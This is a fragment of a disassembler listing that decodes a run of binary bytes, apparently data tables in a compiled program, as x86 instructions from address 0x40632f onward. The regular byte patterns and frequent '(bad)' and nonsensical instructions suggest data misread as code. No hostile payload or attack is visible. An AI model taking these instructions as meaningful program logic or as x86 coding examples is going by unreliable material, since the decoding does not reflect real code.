  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 f1 0c 72    	add    %dl,0x720cf108(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 1e 1a 0a    	add    %dl,0xa1a1e00(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 63 07 84    	add    %dl,-0x7bf89d00(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 8d 08 89    	add    %dl,-0x76f77300(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 4d 19 0a    	add    %dl,0xa194d00(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 a3 02 94 00 10    	add    %ah,0x10009402(%ebx)
  406383:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 c4                	add    %al,%ah
  40638d:	04 58                	add    $0x58,%al
  40638f:	00 11                	add    %dl,(%ecx)
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  406395:	00 00                	add    %al,(%eax)
  406397:	00 96 00 86 19 9a    	add    %dl,-0x65e67a00(%esi)
  40639d:	00 12                	add    %dl,(%edx)
  40639f:	00 c8                	add    %cl,%al
  4063a1:	30 00                	xor    %al,(%eax)
  4063a3:	00 00                	add    %al,(%eax)
  4063a5:	00 91 00 fd 0c 9a    	add    %dl,-0x65f30300(%ecx)
  4063ab:	00 13                	add    %dl,(%ebx)
  4063ad:	00 35 21 00 00 00    	add    %dh,0x21
  4063b3:	00 91 18 04 15 0a    	add    %dl,0xa150418(%ecx)
  4063b9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063bc:	10 31                	adc    %dh,(%ecx)
  4063be:	00 00                	add    %al,(%eax)
  4063c0:	00 00                	add    %al,(%eax)
  4063c2:	96                   	xchg   %eax,%esi
  4063c3:	00 0a                	add    %cl,(%edx)
  4063c5:	0f 0a                	(bad)
  4063c7:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063ca:	78 20                	js     0x4063ec
  4063cc:	00 00                	add    %al,(%eax)
  4063ce:	00 00                	add    %al,(%eax)
  4063d0:	86 18                	xchg   %bl,(%eax)
  4063d2:	fe                   	(bad)
  4063d3:	14 0e                	adc    $0xe,%al
  4063d5:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063d8:	41                   	inc    %ecx
  4063d9:	21 00                	and    %eax,(%eax)
  4063db:	00 00                	add    %al,(%eax)
  4063dd:	00 96 00 3c 17 0a    	add    %dl,0xa173c00(%esi)
  4063e3:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063e6:	f8                   	clc
  4063e7:	33 00                	xor    (%eax),%eax
  4063e9:	00 00                	add    %al,(%eax)
  4063eb:	00 91 00 59 0e 1d    	add    %dl,0x1d0e5900(%ecx)
  4063f1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063f4:	50                   	push   %eax
  4063f5:	34 00                	xor    $0x0,%al
  4063f7:	00 00                	add    %al,(%eax)
  4063f9:	00 91 00 66 02 1d    	add    %dl,0x1d026600(%ecx)
  4063ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  406402:	a0 34 00 00 00       	mov    0x34,%al
  406407:	00 91 00 48 14 1d    	add    %dl,0x1d144800(%ecx)
  40640d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406410:	dc 35 00 00 00 00    	fdivl  0x0
  406416:	91                   	xchg   %eax,%ecx
  406417:	00 e4                	add    %ah,%ah
  406419:	13 1d 00 14 00 20    	adc    0x20001400,%ebx
  40641f:	36 00 00             	add    %al,%ss:(%eax)
  406422:	00 00                	add    %al,(%eax)
  406424:	91                   	xchg   %eax,%ecx
  406425:	00 85 05 1d 00 14    	add    %al,0x14001d05(%ebp)
  40642b:	00 78 20             	add    %bh,0x20(%eax)
  40642e:	00 00                	add    %al,(%eax)
  406430:	00 00                	add    %al,(%eax)
  406432:	86 18                	xchg   %bl,(%eax)
  406434:	fe                   	(bad)
  406435:	14 0e                	adc    $0xe,%al
  406437:	00 14 00             	add    %dl,(%eax,%eax,1)
  40643a:	6c                   	insb   (%dx),%es:(%edi)
  40643b:	36 00 00             	add    %al,%ss:(%eax)
  40643e:	00 00                	add    %al,(%eax)
  406440:	96                   	xchg   %eax,%esi
  406441:	00 ef                	add    %ch,%bh
  406443:	01 c3                	add    %eax,%ebx
  406445:	00 14 00             	add    %dl,(%eax,%eax,1)
  406448:	f0 36 00 00          	lock add %al,%ss:(%eax)
  40644c:	00 00                	add    %al,(%eax)
  40644e:	96                   	xchg   %eax,%esi
  40644f:	00 2c 0d c7 00 14 00 	add    %ch,0x1400c7(,%ecx,1)
  406456:	5c                   	pop    %esp
  406457:	37                   	aaa
  406458:	00 00                	add    %al,(%eax)
  40645a:	00 00                	add    %al,(%eax)
  40645c:	96                   	xchg   %eax,%esi
  40645d:	00 11                	add    %dl,(%ecx)
  40645f:	12 53 00             	adc    0x0(%ebx),%dl
  406462:	15 00 7b 21 00       	adc    $0x217b00,%eax
  406467:	00 00                	add    %al,(%eax)
  406469:	00 96 00 d4 10 1d    	add    %dl,0x1d10d400(%esi)
  40646f:	00 15 00 18 39 00    	add    %dl,0x391800
  406475:	00 00                	add    %al,(%eax)
  406477:	00 96 00 e4 19 0a    	add    %dl,0xa19e400(%esi)
  40647d:	00 15 00 90 39 00    	add    %dl,0x399000
  406483:	00 00                	add    %al,(%eax)
  406485:	00 96 00 b0 18 c3    	add    %dl,-0x3ce75000(%esi)
  40648b:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406491:	00 00                	add    %al,(%eax)
  406493:	00 96 00 80 13 d5    	add    %dl,-0x2aec8000(%esi)
  406499:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  40649f:	00 00                	add    %al,(%eax)
  4064a1:	00 96 00 76 12 0a    	add    %dl,0xa127600(%esi)
  4064a7:	00 16                	add    %dl,(%esi)
  4064a9:	00 f8                	add    %bh,%al
  4064ab:	3a 00                	cmp    (%eax),%al
  4064ad:	00 00                	add    %al,(%eax)
  4064af:	00 96 00 8d 06 c3    	add    %dl,-0x3cf97300(%esi)
  4064b5:	00 16                	add    %dl,(%esi)
  4064b7:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	00 96 00 35 1c 1d    	add    %dl,0x1d1c3500(%esi)
  4064c3:	00 16                	add    %dl,(%esi)
  4064c5:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064cb:	00 96 00 2a 1c 0a    	add    %dl,0xa1c2a00(%esi)
  4064d1:	00 16                	add    %dl,(%esi)
  4064d3:	00 00                	add    %al,(%eax)
  4064d5:	00 00                	add    %al,(%eax)
  4064d7:	00 80 00 96 20 fd    	add    %al,-0x2df6a00(%eax)
  4064dd:	1b e0                	sbb    %eax,%esp
  4064df:	00 16                	add    %dl,(%esi)
  4064e1:	00 00                	add    %al,(%eax)
  4064e3:	00 00                	add    %al,(%eax)
  4064e5:	00 80 00 96 20 e8    	add    %al,-0x17df6a00(%eax)
  4064eb:	1b e4                	sbb    %esp,%esp
  4064ed:	00 16                	add    %dl,(%esi)
  4064ef:	00 00                	add    %al,(%eax)
  4064f1:	00 00                	add    %al,(%eax)
  4064f3:	00 80 00 96 20 e6    	add    %al,-0x19df6a00(%eax)
  4064f9:	05 ec 00 19 00       	add    $0x1900ec,%eax
  4064fe:	00 00                	add    %al,(%eax)
  406500:	00 00                	add    %al,(%eax)
  406502:	80 00 96             	addb   $0x96,(%eax)
  406505:	20 fe                	and    %bh,%dh
  406507:	1a f1                	sbb    %cl,%dh
  406509:	00 1a                	add    %bl,(%edx)
  40650b:	00 00                	add    %al,(%eax)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	00 80 00 96 20 ba    	add    %al,-0x45df6a00(%eax)
  406515:	08 f8                	or     %bh,%al
  406517:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40651a:	00 00                	add    %al,(%eax)
  40651c:	00 00                	add    %al,(%eax)
  40651e:	80 00 96             	addb   $0x96,(%eax)
  406521:	20 7b 0e             	and    %bh,0xe(%ebx)
  406524:	ff 00                	incl   (%eax)
  406526:	1d 00 ad 21 00       	sbb    $0x21ad00,%eax
  40652b:	00 00                	add    %al,(%eax)
  40652d:	00 96 00 c4 0b 1c    	add    %dl,0x1c0bc400(%esi)
  406533:	01 20                	add    %esp,(%eax)
  406535:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406539:	00 00                	add    %al,(%eax)
  40653b:	00 96 00 66 19 0a    	add    %dl,0xa196600(%esi)
  406541:	00 22                	add    %ah,(%edx)
  406543:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  40654a:	96                   	xchg   %eax,%esi
  40654b:	00 ec                	add    %ch,%ah
  40654d:	19 0a                	sbb    %ecx,(%edx)
  40654f:	00 22                	add    %ah,(%edx)
  406551:	00 f4                	add    %dh,%ah
  406553:	3b 00                	cmp    (%eax),%eax
  406555:	00 00                	add    %al,(%eax)
  406557:	00 96 00 b8 0a 23    	add    %dl,0x230ab800(%esi)
  40655d:	01 22                	add    %esp,(%edx)
  40655f:	00 60 3c             	add    %ah,0x3c(%eax)
  406562:	00 00                	add    %al,(%eax)
  406564:	00 00                	add    %al,(%eax)
  406566:	96                   	xchg   %eax,%esi
  406567:	00 af 0a 2a 01 24    	add    %ch,0x24012a0a(%edi)
  40656d:	00 cc                	add    %cl,%ah
  40656f:	3c 00                	cmp    $0x0,%al
  406571:	00 00                	add    %al,(%eax)
  406573:	00 96 00 98 0a 84    	add    %dl,-0x7bf56800(%esi)
  406579:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  40657f:	00 00                	add    %al,(%eax)
  406581:	00 96 00 b4 1c 1d    	add    %dl,0x1d1cb400(%esi)
  406587:	00 26                	add    %ah,(%esi)
  406589:	00 cd                	add    %cl,%ch
  40658b:	21 00                	and    %eax,(%eax)
  40658d:	00 00                	add    %al,(%eax)
  40658f:	00 91 18 04 15 0a    	add    %dl,0xa150418(%ecx)
  406595:	00 26                	add    %ah,(%esi)
  406597:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  40659d:	00 96 00 0c 03 9a    	add    %dl,-0x65fcf400(%esi)
  4065a3:	00 26                	add    %ah,(%esi)
  4065a5:	00 d4                	add    %dl,%ah
  4065a7:	3f                   	aas
  4065a8:	00 00                	add    %al,(%eax)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	91                   	xchg   %eax,%ecx
  4065ad:	00 95 05 38 01 27    	add    %dl,0x27013805(%ebp)
  4065b3:	00 e3                	add    %ah,%bl
  4065b5:	21 00                	and    %eax,(%eax)
  4065b7:	00 00                	add    %al,(%eax)
  4065b9:	00 91 00 62 03 0a    	add    %dl,0xa036200(%ecx)
  4065bf:	00 28                	add    %ch,(%eax)
  4065c1:	00 13                	add    %dl,(%ebx)
  4065c3:	22 00                	and    (%eax),%al
  4065c5:	00 00                	add    %al,(%eax)
  4065c7:	00 96 00 9a 14 3e    	add    %dl,0x3e149a00(%esi)
  4065cd:	01 28                	add    %ebp,(%eax)
  4065cf:	00 4a 22             	add    %cl,0x22(%edx)
  4065d2:	00 00                	add    %al,(%eax)
  4065d4:	00 00                	add    %al,(%eax)
  4065d6:	91                   	xchg   %eax,%ecx
  4065d7:	18 04 15 0a 00 29 00 	sbb    %al,0x29000a(,%edx,1)
  4065de:	f4                   	hlt
  4065df:	40                   	inc    %eax
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	00 00                	add    %al,(%eax)
  4065e4:	86 18                	xchg   %bl,(%eax)
  4065e6:	fe                   	(bad)
  4065e7:	14 6b                	adc    $0x6b,%al
  4065e9:	01 29                	add    %ebp,(%ecx)
  4065eb:	00 56 22             	add    %dl,0x22(%esi)
  4065ee:	00 00                	add    %al,(%eax)
  4065f0:	00 00                	add    %al,(%eax)
  4065f2:	86 00                	xchg   %al,(%eax)
  4065f4:	75 1b                	jne    0x406611
  4065f6:	70 01                	jo     0x4065f9
  4065f8:	2a 00                	sub    (%eax),%al
  4065fa:	6c                   	insb   (%dx),%es:(%edi)
  4065fb:	41                   	inc    %ecx
  4065fc:	00 00                	add    %al,(%eax)
  4065fe:	00 00                	add    %al,(%eax)
  406600:	86 00                	xchg   %al,(%eax)
  406602:	75 1b                	jne    0x40661f
  406604:	75 01                	jne    0x406607
  406606:	2b 00                	sub    (%eax),%eax
  406608:	6e                   	outsb  %ds:(%esi),(%dx)
  406609:	22 00                	and    (%eax),%al
  40660b:	00 00                	add    %al,(%eax)
  40660d:	00 86 00 6d 1b 70    	add    %al,0x701b6d00(%esi)
  406613:	01 2c 00             	add    %ebp,(%eax,%eax,1)
  406616:	c4 42 00             	les    0x0(%edx),%eax
  406619:	00 00                	add    %al,(%eax)
  40661b:	00 86 00 6d 1b 75    	add    %al,0x751b6d00(%esi)
  406621:	01 2d 00 84 44 00    	add    %ebp,0x448400
  406627:	00 48 00             	add    %cl,0x0(%eax)
  40662a:	81 00 e0 0e 7c 01    	addl   $0x17c0ee0,(%eax)
  406630:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  406637:	00 91 18 04 15 0a    	add    %dl,0xa150418(%ecx)
  40663d:	00 30                	add    %dh,(%eax)
  40663f:	00 b4 44 00 00 00 00 	add    %dh,0x0(%esp,%eax,2)
  406646:	96                   	xchg   %eax,%esi
  406647:	00 16                	add    %dl,(%esi)
  406649:	0d c7 00 30 00       	or     $0x3000c7,%eax
  40664e:	40                   	inc    %eax
  40664f:	45                   	inc    %ebp
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	96                   	xchg   %eax,%esi
  406655:	00 16                	add    %dl,(%esi)
  406657:	0d 84 01 31 00       	or     $0x310184,%eax
  40665c:	9f                   	lahf
  40665d:	22 00                	and    (%eax),%al
  40665f:	00 00                	add    %al,(%eax)
  406661:	00 96 00 3b 16 2a    	add    %dl,0x2a163b00(%esi)
  406667:	01 32                	add    %esi,(%edx)
  406669:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406670:	96                   	xchg   %eax,%esi
  406671:	00 ac 0c 93 01 33 00 	add    %ch,0x330193(%esp,%ecx,1)
  406678:	80 45 00 00          	addb   $0x0,0x0(%ebp)
  40667c:	00 00                	add    %al,(%eax)
  40667e:	96                   	xchg   %eax,%esi
  40667f:	00 86 0c 93 01 34    	add    %al,0x3401930c(%esi)
  406685:	00 c8                	add    %cl,%al
  406687:	45                   	inc    %ebp
  406688:	00 00                	add    %al,(%eax)
  40668a:	00 00                	add    %al,(%eax)
  40668c:	96                   	xchg   %eax,%esi
  40668d:	00 b6 0c 93 01 35    	add    %dh,0x3501930c(%esi)
  406693:	00 10                	add    %dl,(%eax)
  406695:	46                   	inc    %esi
  406696:	00 00                	add    %al,(%eax)
  406698:	00 00                	add    %al,(%eax)
  40669a:	96                   	xchg   %eax,%esi
  40669b:	00 82 16 84 01 36    	add    %al,0x36018416(%edx)
  4066a1:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066a7:	00 96 00 d6 00 99    	add    %dl,-0x66ff2a00(%esi)
  4066ad:	01 37                	add    %esi,(%edi)
  4066af:	00 c6                	add    %al,%dh
  4066b1:	22 00                	and    (%eax),%al
  4066b3:	00 00                	add    %al,(%eax)
  4066b5:	00 96 00 76 00 9f    	add    %dl,-0x60ff8a00(%esi)
  4066bb:	01 38                	add    %edi,(%eax)
  4066bd:	00 ea                	add    %ch,%dl
  4066bf:	22 00                	and    (%eax),%al
  4066c1:	00 00                	add    %al,(%eax)
  4066c3:	00 96 00 f1 00 a5    	add    %dl,-0x5aff0f00(%esi)
  4066c9:	01 39                	add    %edi,(%ecx)
  4066cb:	00 fe                	add    %bh,%dh
  4066cd:	22 00                	and    (%eax),%al
  4066cf:	00 00                	add    %al,(%eax)
  4066d1:	00 96 00 bd 05 ab    	add    %dl,-0x54fa4300(%esi)
  4066d7:	01 3a                	add    %edi,(%edx)
  4066d9:	00 78 20             	add    %bh,0x20(%eax)
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	00 00                	add    %al,(%eax)
  4066e0:	86 18                	xchg   %bl,(%eax)
  4066e2:	fe                   	(bad)
  4066e3:	14 0e                	adc    $0xe,%al
  4066e5:	00 3b                	add    %bh,(%ebx)
  4066e7:	00 0b                	add    %cl,(%ebx)
  4066e9:	23 00                	and    (%eax),%eax
  4066eb:	00 00                	add    %al,(%eax)
  4066ed:	00 91 18 04 15 0a    	add    %dl,0xa150418(%ecx)
  4066f3:	00 3b                	add    %bh,(%ebx)
  4066f5:	00 17                	add    %dl,(%edi)
  4066f7:	23 00                	and    (%eax),%eax
  4066f9:	00 00                	add    %al,(%eax)
  4066fb:	00 86 18 fe 14 b1    	add    %al,-0x4eeb01e8(%esi)
  406701:	01 3b                	add    %edi,(%ebx)
  406703:	00 2d 23 00 00 00    	add    %ch,0x23
  406709:	00 e1                	add    %ah,%cl
  40670b:	09 c8                	or     %ecx,%eax
  40670d:	1a bb 01 3c 00 40    	sbb    0x40003c01(%ebx),%bh
  406713:	23 00                	and    (%eax),%eax
  406715:	00 00                	add    %al,(%eax)
  406717:	00 e1                	add    %ah,%cl
  406719:	01 b4 1b bf 01 3c 00 	add    %esi,0x3c01bf(%ebx,%ebx,1)
  406720:	63 23                	arpl   %esp,(%ebx)
  406722:	00 00                	add    %al,(%eax)
  406724:	00 00                	add    %al,(%eax)
  406726:	e1 01                	loope  0x406729
  406728:	a3 19 0e 00 3c       	mov    %eax,0x3c000e19
  40672d:	00 6c 23 00          	add    %ch,0x0(%ebx,%eiz,1)
  406731:	00 00                	add    %al,(%eax)
  406733:	00 86 18 fe 14 cb    	add    %al,-0x34eb01e8(%esi)
  406739:	01 3c 00             	add    %edi,(%eax,%eax,1)
  40673c:	82 23 00             	andb   $0x0,(%ebx)
  40673f:	00 00                	add    %al,(%eax)
  406741:	00 86 00 22 03 d7    	add    %al,-0x28fcde00(%esi)
  406747:	01 3e                	add    %edi,(%esi)
  406749:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  40674f:	00 86 00 22 03 dc    	add    %al,-0x23fcde00(%esi)
  406755:	01 3e                	add    %edi,(%esi)
  406757:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  40675d:	00 86 00 22 03 e2    	add    %al,-0x1dfcde00(%esi)
  406763:	01 3f                	add    %edi,(%edi)
  406765:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  40676b:	00 86 00 22 03 e8    	add    %al,-0x17fcde00(%esi)
  406771:	01 40 00             	add    %eax,0x0(%eax)
  406774:	cb                   	lret
  406775:	23 00                	and    (%eax),%eax
  406777:	00 00                	add    %al,(%eax)
  406779:	00 86 08 ce 0f ee    	add    %al,-0x11f031f8(%esi)
  40677f:	01 41 00             	add    %eax,0x0(%ecx)
  406782:	d9 23                	fldenv (%ebx)
  406784:	00 00                	add    %al,(%eax)
  406786:	00 00                	add    %al,(%eax)
  406788:	86 08                	xchg   %cl,(%eax)
  40678a:	7a 0d                	jp     0x406799
  40678c:	f4                   	hlt
  40678d:	01 42 00             	add    %eax,0x0(%edx)
  406790:	e6 23                	out    %al,$0x23
  406792:	00 00                	add    %al,(%eax)
  406794:	00 00                	add    %al,(%eax)
  406796:	81 00 8c 07 6b 01    	addl   $0x16b078c,(%eax)
  40679c:	42                   	inc    %edx
  40679d:	00 48 46             	add    %cl,0x46(%eax)
  4067a0:	00 00                	add    %al,(%eax)
  4067a2:	00 00                	add    %al,(%eax)
  4067a4:	81 00 c3 12 0e 00    	addl   $0xe12c3,(%eax)
  4067aa:	43                   	inc    %ebx
  4067ab:	00 8c 46 00 00 00 00 	add    %cl,0x0(%esi,%eax,2)
  4067b2:	81 00 1d 03 d7 01    	addl   $0x1d7031d,(%eax)
  4067b8:	43                   	inc    %ebx
  4067b9:	00 b4 46 00 00 00 00 	add    %dh,0x0(%esi,%eax,2)
  4067c0:	81 00 66 0b 0a 02    	addl   $0x20a0b66,(%eax)
  4067c6:	43                   	inc    %ebx
  4067c7:	00 30                	add    %dh,(%eax)
  4067c9:	47                   	inc    %edi
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	00 00                	add    %al,(%eax)
  4067ce:	86 00                	xchg   %al,(%eax)
  4067d0:	0d 19 dc 01 44       	or     $0x4401dc19,%eax
  4067d5:	00 00                	add    %al,(%eax)
  4067d7:	24 00                	and    $0x0,%al
  4067d9:	00 00                	add    %al,(%eax)
  4067db:	00 81 00 9b 04 d7    	add    %al,-0x28fb6500(%ecx)
  4067e1:	01 45 00             	add    %eax,0x0(%ebp)
  4067e4:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067e7:	00 00                	add    %al,(%eax)
  4067e9:	00 81 00 ac 04 d7    	add    %al,-0x28fb5400(%ecx)
  4067ef:	01 45 00             	add    %eax,0x0(%ebp)
  4067f2:	42                   	inc    %edx
  4067f3:	24 00                	and    $0x0,%al
  4067f5:	00 00                	add    %al,(%eax)
  4067f7:	00 86 00 b1 04 d7    	add    %al,-0x28fb4f00(%esi)
  4067fd:	01 45 00             	add    %eax,0x0(%ebp)
  406800:	5c                   	pop    %esp
  406801:	47                   	inc    %edi
  406802:	00 00                	add    %al,(%eax)
  406804:	00 00                	add    %al,(%eax)
  406806:	81 00 6d 12 0f 02    	addl   $0x20f126d,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	00 24 48             	add    %ah,(%eax,%ecx,2)
  406810:	00 00                	add    %al,(%eax)
  406812:	00 00                	add    %al,(%eax)
  406814:	81 00 50 1c 0f 02    	addl   $0x20f1c50,(%eax)
  40681a:	46                   	inc    %esi
  40681b:	00 4a 24             	add    %cl,0x24(%edx)
  40681e:	00 00                	add    %al,(%eax)
  406820:	00 00                	add    %al,(%eax)
  406822:	86 00                	xchg   %al,(%eax)
  406824:	d7                   	xlat   %ds:(%ebx)
  406825:	13 15 02 47 00 5f    	adc    0x5f004702,%edx
  40682b:	24 00                	and    $0x0,%al
  40682d:	00 00                	add    %al,(%eax)
  40682f:	00 86 00 c2 00 1a    	add    %al,0x1a00c200(%esi)
  406835:	02 48 00             	add    0x0(%eax),%cl
  406838:	d8 48 00             	fmuls  0x0(%eax)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	00 86 00 b6 00 1f    	add    %al,0x1f00b600(%esi)
  406843:	02 49 00             	add    0x0(%ecx),%cl
  406846:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	86 00                	xchg   %al,(%eax)
  40684e:	ca 13 23             	lret   $0x2313
  406851:	02 49 00             	add    0x0(%ecx),%cl
  406854:	28 4a 00             	sub    %cl,0x0(%edx)
  406857:	00 00                	add    %al,(%eax)
  406859:	00 86 00 f7 18 27    	add    %al,0x2718f700(%esi)
  40685f:	02 49 00             	add    0x0(%ecx),%cl
  406862:	74 24                	je     0x406888
  406864:	00 00                	add    %al,(%eax)
  406866:	00 00                	add    %al,(%eax)
  406868:	86 00                	xchg   %al,(%eax)
  40686a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40686b:	16                   	push   %ss
  40686c:	2b 02                	sub    (%edx),%eax
  40686e:	49                   	dec    %ecx
  40686f:	00 bc 4a 00 00 00 00 	add    %bh,0x0(%edx,%ecx,2)
  406876:	86 00                	xchg   %al,(%eax)
  406878:	9c                   	pushf
  406879:	16                   	push   %ss
  40687a:	31 02                	xor    %eax,(%edx)
  40687c:	4a                   	dec    %edx
  40687d:	00 85 24 00 00 00    	add    %al,0x24(%ebp)
  406883:	00 86 00 22 03 36    	add    %al,0x36032200(%esi)
  406889:	02 4a 00             	add    0x0(%edx),%cl
  40688c:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  406893:	00 22                	add    %ah,(%edx)
  406895:	03 3c 02             	add    (%edx,%eax,1),%edi
  406898:	4c                   	dec    %esp
  406899:	00 6c 4b 00          	add    %ch,0x0(%ebx,%ecx,2)
  40689d:	00 00                	add    %al,(%eax)
  40689f:	00 86 00 8c 16 42    	add    %al,0x42168c00(%esi)
  4068a5:	02 4e 00             	add    0x0(%esi),%cl
  4068a8:	c4 4b 00             	les    0x0(%ebx),%ecx
  4068ab:	00 00                	add    %al,(%eax)
  4068ad:	00 86 00 61 06 42    	add    %al,0x42066100(%esi)
  4068b3:	02 4f 00             	add    0x0(%edi),%cl
  4068b6:	10 4c 00 00          	adc    %cl,0x0(%eax,%eax,1)
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	86 00                	xchg   %al,(%eax)
  4068be:	2d 19 dc 01 50       	sub    $0x5001dc19,%eax
  4068c3:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068c9:	00 86 00 48 0f 0e    	add    %al,0xe0f4800(%esi)
  4068cf:	00 51 00             	add    %dl,0x0(%ecx)
  4068d2:	c6                   	(bad)
  4068d3:	24 00                	and    $0x0,%al
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	00 86 00 a0 0c 6b    	add    %al,0x6b0ca000(%esi)
  4068dd:	01 51 00             	add    %edx,0x0(%ecx)
  4068e0:	d6                   	salc
  4068e1:	24 00                	and    $0x0,%al
  4068e3:	00 00                	add    %al,(%eax)
  4068e5:	00 86 00 94 0c 47    	add    %al,0x470c9400(%esi)
  4068eb:	02 52 00             	add    0x0(%edx),%dl
  4068ee:	f4                   	hlt
  4068ef:	24 00                	and    $0x0,%al
  4068f1:	00 00                	add    %al,(%eax)
  4068f3:	00 86 00 78 10 4b    	add    %al,0x4b107800(%esi)
  4068f9:	02 52 00             	add    0x0(%edx),%dl
  4068fc:	09 25 00 00 00 00    	or     %esp,0x0
  406902:	86 00                	xchg   %al,(%eax)
  406904:	3a 06                	cmp    (%esi),%al
  406906:	50                   	push   %eax
  406907:	02 53 00             	add    0x0(%ebx),%dl
  40690a:	1f                   	pop    %ds
  40690b:	25 00 00 00 00       	and    $0x0,%eax
  406910:	86 00                	xchg   %al,(%eax)
  406912:	02 19                	add    (%ecx),%bl
  406914:	55                   	push   %ebp
  406915:	02 54 00 cc          	add    -0x34(%eax,%eax,1),%dl
  406919:	4c                   	dec    %esp
  40691a:	00 00                	add    %al,(%eax)
  40691c:	00 00                	add    %al,(%eax)
  40691e:	86 00                	xchg   %al,(%eax)
  406920:	72 16                	jb     0x406938
  406922:	2b 02                	sub    (%edx),%eax
  406924:	55                   	push   %ebp
  406925:	00 24 4d 00 00 00 00 	add    %ah,0x0(,%ecx,2)
  40692c:	86 00                	xchg   %al,(%eax)
  40692e:	52                   	push   %edx
  40692f:	06                   	push   %es
  406930:	6b 01 56             	imul   $0x56,(%ecx),%eax
  406933:	00 48 4d             	add    %cl,0x4d(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	00 00                	add    %al,(%eax)
  40693a:	86 00                	xchg   %al,(%eax)
  40693c:	90                   	nop
  40693d:	0f                   	(bad)
  40693e:	0f 02 57 00          	lar    0x0(%edi),%edx
  406942:	5c                   	pop    %esp
  406943:	53                   	push   %ebx
  406944:	00 00                	add    %al,(%eax)
  406946:	00 00                	add    %al,(%eax)
  406948:	86 00                	xchg   %al,(%eax)
  40694a:	2e 16                	cs push %ss
  40694c:	31 02                	xor    %eax,(%edx)
  40694e:	58                   	pop    %eax
  40694f:	00 c8                	add    %cl,%al
  406951:	53                   	push   %ebx
  406952:	00 00                	add    %al,(%eax)
  406954:	00 00                	add    %al,(%eax)
  406956:	86 00                	xchg   %al,(%eax)
  406958:	5f                   	pop    %edi
  406959:	0f                   	(bad)
  40695a:	0f 02 58 00          	lar    0x0(%eax),%ebx
  40695e:	34 25                	xor    $0x25,%al
  406960:	00 00                	add    %al,(%eax)
  406962:	00 00                	add    %al,(%eax)
  406964:	86 08                	xchg   %cl,(%eax)
  406966:	6c                   	insb   (%dx),%es:(%edi)
  406967:	0c 47                	or     $0x47,%al
  406969:	02 59 00             	add    0x0(%ecx),%bl
  40696c:	3c 25                	cmp    $0x25,%al
  40696e:	00 00                	add    %al,(%eax)
  406970:	00 00                	add    %al,(%eax)
  406972:	86 08                	xchg   %cl,(%eax)
  406974:	79 0c                	jns    0x406982
  406976:	6b 01 59             	imul   $0x59,(%ecx),%eax
  406979:	00 45 25             	add    %al,0x25(%ebp)
  40697c:	00 00                	add    %al,(%eax)
  40697e:	00 00                	add    %al,(%eax)
  406980:	86 08                	xchg   %cl,(%eax)
  406982:	ae                   	scas   %es:(%edi),%al
  406983:	13 23                	adc    (%ebx),%esp
  406985:	02 5a 00             	add    0x0(%edx),%bl
  406988:	4d                   	dec    %ebp
  406989:	25 00 00 00 00       	and    $0x0,%eax
  40698e:	86 08                	xchg   %cl,(%eax)
  406990:	bc 13 15 02 5a       	mov    $0x5a021513,%esp
  406995:	00 56 25             	add    %dl,0x25(%esi)
  406998:	00 00                	add    %al,(%eax)
  40699a:	00 00                	add    %al,(%eax)
  40699c:	86 08                	xchg   %cl,(%eax)
